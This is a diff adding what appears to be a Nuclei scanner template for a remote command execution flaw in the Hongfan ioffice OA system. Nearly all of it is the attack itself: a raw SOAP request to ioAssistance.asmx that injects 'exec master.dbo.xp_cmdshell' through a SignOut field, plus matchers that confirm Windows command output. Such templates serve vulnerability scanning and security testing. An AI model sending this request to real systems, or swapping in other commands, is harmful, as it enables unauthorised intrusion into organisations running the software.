@@ -1,0 +1,37 @@
+id: ioffice-oa-rce
+
+info:
+  name: 红帆 ioffice OA 系统 ioAssistance.asmx 文件远程命令执行漏洞
+  author: Str1am
+  severity: critical
+  tags: oa,rce
+
+requests:
+  - raw:
+      - |
+        POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+        SOAPAction: http://tempuri.org/SignOut
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+          <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+            <soap:Body>
+              <SignOut xmlns="http://tempuri.org/">
+                <sql>exec master.dbo.xp_cmdshell 'cmd /c ver'</sql>
+              </SignOut>
+            </soap:Body>
+          </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<output>"
+          - "Windows"
+        part: body
+        condition: and
